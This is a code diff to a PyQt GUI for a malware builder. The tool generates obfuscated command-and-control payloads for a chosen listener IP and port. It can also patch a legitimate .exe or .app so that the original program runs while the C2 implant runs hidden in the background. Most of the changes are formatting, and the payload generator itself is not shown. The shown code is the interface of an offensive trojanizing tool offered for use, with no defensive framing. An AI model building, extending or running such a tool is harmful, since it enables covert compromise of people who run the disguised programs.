@@ -29,7 +29,14 @@ class BundlerWorker(QThread):
     progress = pyqtSignal(str)
     finished = pyqtSignal(bool)
 
-    def __init__(self, listener_ip, listener_port, obfuscation, platform="windows", patch_file=None):
+    def __init__(
+        self,
+        listener_ip,
+        listener_port,
+        obfuscation,
+        platform="windows",
+        patch_file=None,
+    ):
         super().__init__()
         self.listener_ip = listener_ip
         self.listener_port = listener_port
@@ -67,25 +74,27 @@ class BundlerWorker(QThread):
             from c2_bundler_simple import create_bundled_payload
 
             self.progress.emit("[*] Creating C2 payload...")
-            
+
             # Si patch_file existe, on l'intègre
             if self.patch_file:
                 self.progress.emit(f"[*] Patching file: {self.patch_file}")
                 self.progress.emit(f"[*] Mode: Wrapper (original app + C2 background)")
-            
+
             success = create_bundled_payload(
-                self.listener_ip, 
-                self.listener_port, 
-                obfuscation_level, 
+                self.listener_ip,
+                self.listener_port,
+                obfuscation_level,
                 self.platform,
-                self.patch_file  # Pass patch_file to bundler
+                self.patch_file,  # Pass patch_file to bundler
             )
 
             if success:
                 self.progress.emit("")
                 self.progress.emit("[+] SUCCESS!")
                 if self.patch_file:
-                    self.progress.emit(f"[+] Location: dist/{Path(self.patch_file).name}")
+                    self.progress.emit(
+                        f"[+] Location: dist/{Path(self.patch_file).name}"
+                    )
                     self.progress.emit("[+] Patched file ready!")
                     self.progress.emit("[+] Original app will run + C2 in background!")
                 else:
@@ -119,25 +128,27 @@ class BundlerTab(QWidget):
         # Mode Selection
         mode_group = QGroupBox("📦 Bundle Mode")
         mode_layout = QVBoxLayout()
-        
-        self.patch_mode_checkbox = QCheckBox("Patch existing file (embed C2 in legitimate app)")
+
+        self.patch_mode_checkbox = QCheckBox(
+            "Patch existing file (embed C2 in legitimate app)"
+        )
         self.patch_mode_checkbox.setChecked(False)
         self.patch_mode_checkbox.stateChanged.connect(self.toggle_patch_mode)
         mode_layout.addWidget(self.patch_mode_checkbox)
-        
+
         # File selection
         file_layout = QHBoxLayout()
         self.file_input = QLineEdit()
         self.file_input.setPlaceholderText("Select .exe or .app to patch...")
         self.file_input.setEnabled(False)
         file_layout.addWidget(self.file_input)
-        
+
         self.browse_btn = QPushButton("📁 Browse")
         self.browse_btn.setEnabled(False)
         self.browse_btn.clicked.connect(self.browse_file)
         file_layout.addWidget(self.browse_btn)
         mode_layout.addLayout(file_layout)
-        
+
         mode_group.setLayout(mode_layout)
         layout.addWidget(mode_group)
 
@@ -190,7 +201,7 @@ class BundlerTab(QWidget):
         # GitHub Actions Info
         github_group = QGroupBox("🔧 GitHub Actions (Windows PE Compilation)")
         github_layout = QVBoxLayout()
-        
+
         github_info = QLabel(
             "✅ GitHub Actions is ACTIVE!\n\n"
             "To compile Windows PE x64:\n"
@@ -202,7 +213,7 @@ class BundlerTab(QWidget):
         )
         github_info.setStyleSheet("color: #4CAF50; padding: 10px;")
         github_layout.addWidget(github_info)
-        
+
         github_group.setLayout(github_layout)
         layout.addWidget(github_group)
 
@@ -238,14 +249,14 @@ class BundlerTab(QWidget):
         enabled = state == Qt.Checked
         self.file_input.setEnabled(enabled)
         self.browse_btn.setEnabled(enabled)
-    
+
     def browse_file(self):
         """Browse for file to patch"""
         file_path, _ = QFileDialog.getOpenFileName(
             self,
             "Select file to patch",
             "",
-            "Executables (*.exe *.app);;All Files (*.*)"
+            "Executables (*.exe *.app);;All Files (*.*)",
         )
         if file_path:
             self.file_input.setText(file_path)
@@ -272,7 +283,7 @@ class BundlerTab(QWidget):
             "Linux": "linux",
         }
         platform = platform_map.get(self.platform_combo.currentText(), "windows")
-        
+
         # Get patch file if enabled
         patch_file = None
         if self.patch_mode_checkbox.isChecked():
@@ -282,7 +293,11 @@ class BundlerTab(QWidget):
                 return
 
         self.bundler_worker = BundlerWorker(
-            listener_ip, listener_port, self.obfuscation_combo.currentText(), platform, patch_file
+            listener_ip,
+            listener_port,
+            self.obfuscation_combo.currentText(),
+            platform,
+            patch_file,
         )
 
         self.bundler_worker.progress.connect(self.on_progress)
